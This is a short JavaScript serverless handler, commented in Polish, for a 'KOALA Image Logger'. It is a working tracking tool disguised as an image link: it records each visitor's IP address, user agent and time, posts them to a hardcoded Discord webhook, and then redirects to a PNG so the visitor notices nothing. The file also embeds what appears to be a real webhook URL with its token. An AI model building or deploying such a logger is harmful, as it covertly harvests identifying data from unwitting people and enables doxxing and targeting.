// ====================== KOALA IMAGE LOGGER ======================
// Minimalna działająca wersja

const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

export default async function handler(req, res) {
    // Pobierz IP
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString();

    // Prosta wiadomość
    const message = `[+] KOALA Image Logger - IP Logged\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}`;

    // Wyślij webhook
    try {
        await fetch(YOUR_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error(err);
    }

    // Przekieruj do obrazka (BEZWARUNKOWO)
    // Używamy sprawdzonego URL
    const imageUrl = "https://cdn.discordapp.com/attachments/1054650838129332255/1153307620187312168/convert.png";
    res.redirect(302, imageUrl);
}
